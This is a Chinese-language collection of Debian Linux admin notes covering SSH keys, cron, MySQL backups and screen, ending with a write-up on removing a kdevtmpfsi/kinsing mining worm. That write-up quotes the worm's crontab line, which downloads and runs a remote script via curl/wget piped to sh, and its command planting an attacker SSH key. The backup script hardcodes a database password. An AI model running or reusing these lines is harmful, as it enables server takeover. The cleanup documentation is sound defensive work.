---
title: Debian Linux命令其环境配置
---

<ClientOnly>
  <in-article-adsense
    ins-style="display:block; text-align:center;"
    data-ad-slot="7727965566"
  />
</ClientOnly>

[[toc]]

## Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory

执行安装包安装报错： Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory

```
$ sudo touch /var/lib/dpkg/status
$ sudo apt update && sudo apt upgrade
```

## 复制本地文件到服务器

**scp - secure copy (remote file copy program)**

1. 本地Windows下执行文件复制到指定目录
the **.** just indicates the current directory path.
```
D:\linux> scp [source file] [username]@[destination server]:.
D:\linux> scp cool_stuff.txt pi@192.168.1.17:.
D:\linux> scp cool_stuff.txt pi@192.168.1.17:/this/path/right/here

```

2. 下载远程服务端文件到本地

```
$ scp sanjeev@example.com:cool_stuff.txt /this/path/right/here
```

## 列出tar.gz压缩包的文件

命令: ` tar tzf  test.tar.gz`

## Linux密钥登录和用户名密码登录

对于Linux服务器，默认以密码登陆，安全性比较差，很早前就有计划修改为使用密钥登陆，一直觉得比较麻烦搁置着，其实步骤并不难，只是当时没觉得安全问题有那么严重而已。如果你也是这么认为，那么可以尝试登陆Linux服务器，输入以下命令：
```
lastb | less
```
可以看到几乎每天都会有大量的尝试登陆存在。为了服务器安全，禁止密码登陆，使用密钥方式登陆还是必要的。这里我尽量简单的记录下我设置的过程。

配置方法

### 1. 产生公钥和私钥文件

1. 在服务器端使用如下命令产生公钥和私钥：
```
$  ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): <== 按 Enter
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase): <== 输入密钥锁码，或直接按 Enter 留空
Enter same passphrase again: <== 再输入一遍密钥锁码
Your identification has been saved in /root/.ssh/id_rsa. <== 私钥
Your public key has been saved in /root/.ssh/id_rsa.pub. <== 公钥
The key fingerprint is:
0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host

```
在 当前 用户的家目录中生成了一个 `.ssh` 的隐藏目录，内含两个密钥文件。`id_rsa` 为私钥，`id_rsa.pub` 为公钥。

- 关于此处操作对于阿里云服务器也可以直接在阿里云的“**网络与安全**”-> "**密钥对**"中由阿里云生成。阿里云： https://developer.aliyun.com/article/666688

- 你也可以使用xshell或者puttygen工具等在你自己的机器上产生对应的公钥，然后把**公钥导出为私钥**。


### 2. 在服务器上安装公钥

登陆需要配置密钥登陆的服务器，将公钥内容填入~/.ssh/authorized_keys文件中：

```
$ mkdir ~/.ssh
$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
# 或者如果是客户端自己产生的可以直接编辑
$ nano ~/.ssh/authorized_keys
```

**注意**：保存后，对`.ssh`目录和其中的`authorized_keys`公钥文件设置相应的权限：

```
chown -R root:root ~/.ssh
chmod -R 700  ~/.ssh
chmod -R 644  ~/.ssh/authorized_keys

```

### 3. 设置SSH，打开公钥登录功能

接着修改ssh配置文件：

```
nano /etc/ssh/sshd_config
```
对以下内容去掉注释：

```
RSAAuthentication yes
PubkeyAuthentication yes
# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      .ssh/authorized_keys
# 记得最后面加上这个，否则无法进行密码登录
PasswordAuthentication yes
```

保存后重启sshd服务：

```
systemctl restart sshd
```

### 4. XShell等客户端将私钥下载到客户端，然后使用 

- 如果是通过`ssh-keygen`在服务器产生的公钥和私钥,从服务器下载私钥文件： `/root/.ssh/id_rsa`， 然后在xshell中进行连接使用。
- 如果是自己的电脑上产生的公钥，需要将公钥导出为私钥被保存，然后登录时候使用该私钥。如下截图：
![20200711175803-2020-07-11](https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711175803-2020-07-11.png)


### 5. 关闭原密码登陆方式(小心注意)

如果使用密钥登陆成功，可以继续修改ssh配置文件，关闭密码登陆：

```
nano /etc/ssh/sshd_config
```
设置：

```
PasswordAuthentication no
```
保存后重启sshd服务的步骤同上，这样就完成了密钥登陆的配置。


## Linux中Cache内存占用过高解决办法

文章来源: [解决Linux buffer/cache内存占用过高的办法](https://blog.csdn.net/ailice001/article/details/80353924)

1. 在Linux系统中，我们经常用free命令来查看系统内存的使用状态。
2. 如何回收cache？

```
$ sudo sh -c "echo 1 > /proc/sys/vm/drop_caches":表示清除pagecache。
$ sudo sh -c "echo 2 > /proc/sys/vm/drop_caches":表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。
$ sudo sh -c "echo 3 > /proc/sys/vm/drop_caches":表示清除pagecache和slab分配器中的缓存对象。
```
## 查看当前运行的进程的详细路径

使用命令：

```
$ top -c
```

## 通过进程pid查看进程

执行命令：
```
$ ls  -l /proc/pid
例如：
$ ls -ls /proc/1245
```

## 查看进程占用排序

```
$ ps -aux --sort=-pcpu|head -10

```

## 查看定时任务 crontab命令

```
# 查看定时任务
$ crontab -l  
# 编辑定时任务，删除或者注释定时任务
$ crontab -e
# 编辑，针对的是root用户
$ nano /etc/crontab
# 停止crontab，启动crontab任务
$ systemctl stop cron
$ systemctl restart cron
```

### `/etc/crontab`文件和`crontab -e`命令区别

1. 格式不同。
2. 修改/etc/crontab这种方法只有root用户能用，而crontab -e这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入`/var/spool/cron/usename`。
3. 不管用 `crontab -e` or 改 `/etc/crontab` 都不需要重新启动 crond 服务

## 设置时区

参考设置连接: [Debian 8 设置时区和时间配置](https://www.cnblogs.com/yoyotl/p/8151409.html)

```
$ tzselect
```

## 查看文件夹各个文件大小

```
$ du -sh *
```
## 查看linux的架构 32-bit or 64-bit

```
# 32位还是64位
uname -a
# 下面命令显示CPU架构
lscpu
$ cat /proc/cpuinfo 
Processor       : ARMv7 Processor rev 10 (v7l)
ARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.
If you want to see whether your system supports 64-bit binaries, check the kernel architecture:
$ uname -m
```

## 查看本机打开的端口号

默认情况下Linux的1024以下端口是只有root用户才有权限占用,我们的tomcat,apache, nginx等等程序如果想要用普通用户来占用80端口的话就会抛出 java.net.BindException: Permission denied的异常。

```
查看指定的端口
$ sudo lsof -i:port

查看所有端口
$ sudo netstat -aptn
```

## 创建链接

在当前目录创建一个链接名称`python`,这个链接指向的位置是: `/usr/local/bin/python`,命令如下:
ln -s 源文件 目标目录
```
$ ln -s /usr/local/bin/python python
```

## 删除缓存的安装失败的包

进入目录`/var/cache/apt/archives`,删除下面的所有.deb文件即可

## 修改用户名

```
$ sudo passwd
```

## ssh登录失败

1. 进入谷歌云实例面板
2. 切换到root角色,命令: `sudo -i`
3. 修改SSH配置文件`/etc/ssh/sshd_config`为如下内容:

```
# Authentication:
PermitRootLogin yes //默认为no，需要开启root用户访问改为yes

# Change to no to disable tunnelled clear text passwords
PasswordAuthentication yes //默认为no，改为yes开启密码登陆
```

4. 给root用户设置密码 `passwd root`
5. 重启ssh服务:    `/etc/init.d/ssh restart`
6. 在xshell中，直接使用root账号密码登录。

在客户端或者服务端进行如下ssh链接,查看ssh登录失败的log:
```
> ssh -vvv alterhu2020@host 
```
On the server end, check the logs. `/var/log/auth.log` will give you a pretty good idea about what happens when you try to login, look for messages that contain sshd. There are a variety of reasons why authentication could be failing, ranging from simple (you aren't using the right username) to more complicated (sshd is configured to use the wrong authentication system).

如果以上还不行,直接通过root登录.

## 改变当前用户组

```
$ sudo usermod -g www-data alterhu2020   (需要重启机器生效)
$ groups alterhu2020
$ sudo nano /etc/sudoers
```

## unzip命令中文文件名乱码

采用最新的unzip命令没有参数`-O`，网上提到的使用参数`-O`可以指定编码，所以这个访问不能使用。所以使用`unar`命令:

```
$ sudo apt-get install unar

$ unar -e gb18030 gb18030.zip
```

## 配置linux并发最大打开文件数

进行目录`/etc/profile`添加如下配置信息:

```
# node环境变量
export PATH=/opt/node/node-v12.14.1-linux-armv7l/bin:$PATH

# java环境变量
export JAVA_HOME=/opt/jdk/jdk1.8.0_241
export JRE_HOME=$JAVA_HOME/jre
export PATH=$JAVA_HOME/bin:$PATH
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar

# 设置pipenv
export PATH=$HOME/.local/bin:$PATH

# 设置最大文件数,mysql和websock最大连接数
ulimit -u 1048576
ulimit -n 1048576
ulimit -d unlimited
ulimit -m unlimited
ulimit -s unlimited
ulimit -t unlimited
ulimit -v unlimited

```
以上的配置如果用非root用户双概述可能会出现错误: `-bash: ulimit: max user processes: cannot modify limit: `. 需要修改对应配置文件: `/etc/security/limits.conf `, 在文件末尾增加如下配置信息(* 代表的是任意用户,比如root/pi),命令如下:

`$ sudo nano /etc/security/limits.conf`

```
* soft noproc 1048576
* hard noproc 1048576
* soft nofile 1048576
* hard nofile 1048576

```

## 定时备份mysql数据库，保存7天记录脚本

 脚本参考来源: 
 * [mysql定时备份脚本(推荐)](https://gist.github.com/tleish/1c6e788c84f59200446b)
 * [mysql备份脚本](https://graspingtech.com/schedule-backup-mysql-databases-ubuntu-16-04/)
- mysql备份脚本：
```shell
#!/bin/bash
#==============================================================================
#TITLE:            mysql_backup.sh
#DESCRIPTION:      script for automating the daily mysql backups on development computer
#AUTHOR:           tleish
#DATE:             2013-12-20
#VERSION:          0.4
#USAGE:            ./mysql_backup.sh
#CRON:
  # example cron for daily db backup @ 9:15 am
  # min  hr mday month wday command
  # 15   9  *    *     *    /opt/backup/scripts/mysql_backup.sh

#RESTORE FROM BACKUP
  #$ gunzip < [backupfile.sql.gz] | mysql -u [uname] -p[pass] [dbname]

#==============================================================================
# CUSTOM SETTINGS
#==============================================================================

# directory to put the backup files
BACKUP_DIR=/opt/backup

# MYSQL Parameters
MYSQL_UNAME="syscorer"
MYSQL_PWORD="s6stest2n3gz"


credentialsFile="mysql-credentials.cnf"
echo "[client]" > $credentialsFile
echo "user=$MYSQL_UNAME" >> $credentialsFile
echo "password=$MYSQL_PWORD" >> $credentialsFile
echo "host=localhost" >> $credentialsFile

# Don't backup databases with these names 
# Example: starts with mysql (^mysql) or ends with _schema (_schema$)
IGNORE_DB="(^mysql|_schema|sys$)"

# include mysql and mysqldump binaries for cron bash user
PATH=$PATH:/usr/local/mysql/bin

# Number of days to keep backups
KEEP_BACKUPS_FOR=7 #days

#==============================================================================
# METHODS
#==============================================================================

# YYYY-MM-DD
TIMESTAMP=$(date +%F)

function delete_old_backups()
{
  echo "Deleting $BACKUP_DIR/*.sql.gz older than $KEEP_BACKUPS_FOR days"
  find $BACKUP_DIR -type f -name "*.sql.gz" -mtime +$KEEP_BACKUPS_FOR -exec rm -rf {} \;
}

function mysql_login() {
  # local mysql_login="-u $MYSQL_UNAME" 
  # if [ -n "$MYSQL_PWORD" ]; then
  #   local mysql_login+=" -p$MYSQL_PWORD" 
  # fi
  # echo $mysql_login
  local mysql_login="--defaults-extra-file=$credentialsFile"
}

function database_list() {
  local show_databases_sql="SHOW DATABASES WHERE \`Database\` NOT REGEXP '$IGNORE_DB'"
  echo $(mysql $(mysql_login) -e "$show_databases_sql"|awk -F " " '{if (NR!=1) print $1}')
}

function echo_status(){
  printf '\r'; 
  printf ' %0.s' {0..100} 
  printf '\r'; 
  printf "$1"'\r'
}

function backup_database(){
    backup_file="$BACKUP_DIR/$TIMESTAMP.$database.sql.gz" 
    output+="$database => $backup_file\n"
    echo_status "...backing up $count of $total databases: $database"
    $(mysqldump $(mysql_login) $database | gzip -9 > $backup_file)
}

function backup_databases(){
  local databases=$(database_list)
  local total=$(echo $databases | wc -w | xargs)
  local output=""
  local count=1
  for database in $databases; do
    backup_database
    local count=$((count+1))
  done
  echo -ne $output | column -t
}

function hr(){
  printf '=%.0s' {1..100}
  printf "\n"
}

#==============================================================================
# RUN SCRIPT
#==============================================================================
delete_old_backups
hr
backup_databases
hr
printf "All backed up!\n\n"

```

- 复制上面的脚本文件到目录: `/opt/backup/scripts/mysql_backup.sh`,执行如下命令赋予执行权限：

```shell
$ sudo chmod +x mysql_backup.sh
```
- 执行如下命令，测试脚本是否正常:

```shell
$ sudo ./mysql_backup.sh
```
- 创建`Crontab`定时任务
Usually, you should open your personal crontab file using `crontab -e` command, however if you are root user and decide to choose system wide crontab file, you need to edit the crontab file located in `/etc/crontab`.现在创建一个定时脚本每天夜里执行备份操作：
```shell
# 立即生效
$ sudo crontab -e
# 需要执行重启服务才能生效: sudo systemctl restart cron.service ,不推荐。语法不一样，可能导致不执行
$ sudo nano /etc/crontab
```
我们知道定时任务可以写到/etc/crontab与crontab -e下面，但你知道两者的区别吗?

语法不同

/etc/crontab
```sh
# For details see man 4 crontabs
 
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 ar- 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
``` 
 
 
crontab -e
```sh
*  *  *  *  *  command
```
使用范围
修改`/etc/crontab`这种方法只有root用户能用，这种方法更加方便与直接直接给其他用户设置计划任务，而且还可以指定执行shell等等， `crontab -e`这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入/var/spool/cron/usename

所以推荐使用： `sudo crontab -e`

按照提示添加最后一行定时脚本：

```shell
# Running Cron job Daily
@daily /opt/backup/scripts/mysql_backup.sh >> /var/log/mysql/mysql-backup.log 2>&1
# Running Cron job at 2AM Daily
0 2 * * * /opt/backup/scripts/mysql_backup.sh >> /var/log/mysql/mysql-backup.log 2>&1

# Running Cron job at 12AM & 12PM Daily
0 12,24 * * * /opt/backup/scripts/mysql_backup.sh >> /var/log/mysql/mysql-backup.log 2>&1

```

- 查看执行情况（crontab执行 日志）

执行结果不论是否成功，都会在 `/var/spool/mail/mail`文件中有`crontab`执行日志的记录,另外可以自己指定日志目录，参考后面的命令参数。

## SSH 或者telent登录linux后screen后台运行脚本

Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。后台运行命令。

在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。

- 安装
```shell
$ sudo apt install screen
```
- 命令说明
1. 执行`screen`即可打开一个session，或者加上参数`-s`设置一个session的名称（推荐):
```shell
$ screen
$ screen -S yourname -> 新建一个叫yourname的session
$ screen -ls         -> 列出当前所有的session
$ screen -r yourname -> 回到切换yourname这个session
$ screen -d yourname -> 远程detach某个session
$ screen -d -r yourname -> 结束当前session并回到yourname这个session

```

- 快捷键

1. CTRL - a+d ->(**常用退出切换到后台运行**) detach命令，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 

2. ~~CTRL- a+z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去，基本没有用到~~。

3. `screen -X -S 28835 quit`-> 删除对应的session，其中的`28835`是通过命令`screen -ls`查看到的对应session的id。

## shell脚本中>/dev/null 2>&1

参考文档： https://www.cnblogs.com/youjianjiangnan/p/11561805.html

`>/dev/null` 这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了>/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。
`2>&1` 这条命令用到了重定向绑定，采用&可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，**说人话就是错误输出将会和标准输出输出到同一个地方**。

linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以>/dev/null 2>&1的作用就是让**标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中**。


### nohup结合

我们经常使用nohup command &命令形式来启动一些后台程序，比如一些java服务：

```
# nohup java -jar xxxx.jar &
```
为了不让一些执行信息输出到前台（控制台），我们还会加上刚才提到的>/dev/null 2>&1命令来丢弃所有的输出：

```
# nohup java -jar xxxx.jar >/dev/null 2>&1 &
```

总而言之，在工作中用到最多的就是`nohup command >/dev/null 2>&1 &`命令

## 挖矿木马病毒清理



问题： 无意在使用`top`命令的时候发现一个异常进程: `kdevtmpfsi`,使用`ps -aux | grep kdevtmpfsi`,发现对应的执行文件路径是: `/tmp/kdevtmpfsi`. 然后尝试`kill -9`杀死进程后，再`rm -rf /tmp/kdevtmpfsi`还是会死而复生。

### 木马解析

1. 木马解析： https://xz.aliyun.com/t/4386, https://my.oschina.net/u/4437985/blog/3168526 (推荐)

一般在定时任务（`crontab -l`）中存在异常脚本:

```
[root@mdw ~]# crontab -l
*/15 * * * * （curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sh
```
1). 攻击者通过网络进入第一台被感染的机器(redis未认证漏洞、ssh密码泄露登录等)。
2). 第一台感染的机器会读取known_hosts文件，遍历ssh登录，如果是做了免密登录认证，则将直接进行横向传播。
3). 修改/etc/cron.d/root文件，增加定时任务
4). kill掉同类挖矿进程
5). kill掉高好资源的其他进程
6). 下载执行主恶意程序kerberods
7). 拉起khugepageds挖矿进程
8). 为文件添加chattr锁定
9). 修改IPTABLES
10). 清除日志
11). 关闭SELinux
12). 还有个后门，创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，具体代码如下

```
chmod 700 /root/.ssh/
echo >> /root/.ssh/authorized_keys
chmod 600 root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys


```

### 木马分析

1. 继续查看对应的定时任务目录`nano /etc/crontab`,发现没有对应的病毒形式的定时任务。继续查看用户目录下的定时任务: `/var/spool/cron/`也没有发现非法的定时任务。
```
$ nano /var/spool/cron/crontabs/root

$ nano /var/spool/cron/root

$ nano /etc/cron.d/root

```
2. 这个线程重复启动的原因是**它还有一个守护线程在运行**，检测到这个线程挂掉的时候就去重新启动，从而导致我们周而复始的出现这个问题。PS： 通过 `ps -ef` 命令查出 `kdevtmpfsi` 进程号，直接 kill -9 进程号并删除 /tmp/kdevtmpfsi 执行文件。但没有过1分钟进程又运行了，这时就能想到，kdevtmpfsi 有守护程序或者有计划任务。通过 crontab -l 查看是否有可疑的计划任务。

3. 找到线程和守护线程
根据上面结果知道 kdevtmpfsi 进程号是 10393，使用 `systemctl status 10393` 发现 `kdevtmpfsi` 有守护进程
kill 掉 kdevtmpfsi 守护进程 kill -9 30903 30904，再 killall -9 kdevtmpfsi 挖矿病毒，最后删除 kdevtmpfsi 执行程序 rm -f /tmp/kdevtmpfsi
```
$ pstree -a
$ netstat -natp
```
这时候我们就可以找到kdevtmpfsi线程 和它的守护线程`kinsing`.直接kill线程和它的守护线程:

```
$ ps -aux | grep curl
$ ps -aux|grep kinsing
$ ps -aux|grep kdevtmpfsi


$ kill -9 19128
$ kill -9 3722
$ rm -rf /tmp/kdevtmpfsi
$ rm -rf /var/tmp/kinsing
$ find / -name "kinsing*" | xargs rm -rf
$ find / -name kdevtmpfsi | xargs rm -rf
$ rm -f /root/.ssh/authorized_keys
```

4. 查找可疑定时任务
```
# 首先停止cron服务，避免因其不断执行而导致恶意文件反复下载执行。如果操作系统可以使用service命令
systemctl stop cron
crontab -l 查看定时任务
crontab -r 表示删除用户的定时任务，当执行此命令后，所有用户下面的定时任务会被删除
```
![https://img-blog.csdnimg.cn/20191227100428997.png](https://img-blog.csdnimg.cn/20191227100428997.png)

删除可以定时任务`crontab -e`,编辑删除定时任务即可。

5. 安全加固

5.1. SSH
① 谨慎做免密登录
② 不使用默认的22端口
③ 禁止root登录

5.2. Redis
① 增加授权认证(requirepass参数)
② 尽量使用docker版本(docker pull redis)
③ 隐藏重要的命令

5.3 使用busybox删除

5.4 屏蔽`pastebin.com`、thrysi.com等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的

5.6 `netstat -natp` 命令查看是否有异常陌生IP的TCP连接，查询到有来自国外的陌生IP，做了白名单处理

5.7 启用ssh公钥登陆，禁用密码登陆。
5.8 云主机：完善安全策略，入口流量，一般只开放 80 443 端口就行，出口流量默认可以不限制，如果有需要根据需求来限制。物理机：可以通过硬件防火墙或者机器上iptables 来开放出入口流量规则。
5.9 本机不是直接需要对外提供服务，可以拒绝外网卡入口所有流量，通过 jumper 机器内网登陆业务机器。



### 常见非法的木马病毒


挖矿病毒 | 正常文件 |关联文件 | 原因
---------|----------|----------|----------
 kdevtmpfsi | kdevtmpfs | kinsing |最根本的原因是自己的redis 6379配置不当导致的。大家可以参考阿里云的Redis服务安全加固
 Watchdogs  | Watchdog | 
 trace | trace |




